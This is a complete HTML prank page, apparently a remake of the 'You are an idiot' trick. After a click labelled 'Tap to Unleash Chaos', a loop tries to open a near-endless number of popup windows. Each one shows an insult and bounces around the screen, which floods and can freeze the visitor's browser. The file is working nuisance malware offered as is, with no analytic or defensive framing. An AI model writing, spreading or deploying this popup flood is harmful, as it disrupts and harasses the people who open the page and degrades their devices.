<!DOCTYPE html>
<html>
<head>
  <title>You aren't genius HTML5</title>
  <style>
    html, body {
      margin: 0;
      height: 100%;
      background: black;
      color: lime;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 2em;
      user-select: none;
      cursor: pointer;
    }
  </style>
</head>
<body onclick="unleashChaos()" id="clickArea">
  Tap to Unleash Chaos
  <script>
    function unleashChaos() {
      const body = document.getElementById('clickArea');
      body.textContent = "You aren't genius!";
      body.removeAttribute('onclick');

      // Number of popups
      const popupCount = 999999999999999999999999999999999999;

      for (let i = 0; i < popupCount; i++) {
        let win = window.open('', '_blank', 'width=200,height=150');
        if (win) {
          win.document.write(`
            <title>You aren't genius</title>
            <body style="background:black; color:red; font-size:20px; text-align:center;">
              <p>You are an idiot!</p>
              <script>
                let x = Math.floor(Math.random() * (screen.width - 200));
                let y = Math.floor(Math.random() * (screen.height - 150));
                let dx = 5 - Math.random() * 10;
                let dy = 5 - Math.random() * 10;
                function move() {
                  x += dx;
                  y += dy;
                  if (x < 0 || x > screen.width - 200) dx = -dx;
                  if (y < 0 || y > screen.height - 150) dy = -dy;
                  window.moveTo(x, y);
                  setTimeout(move, 1000);
                }
                move();
              <\/script>
            </body>
          `);
        }
      }
    }
  </script>
</body>
</html>
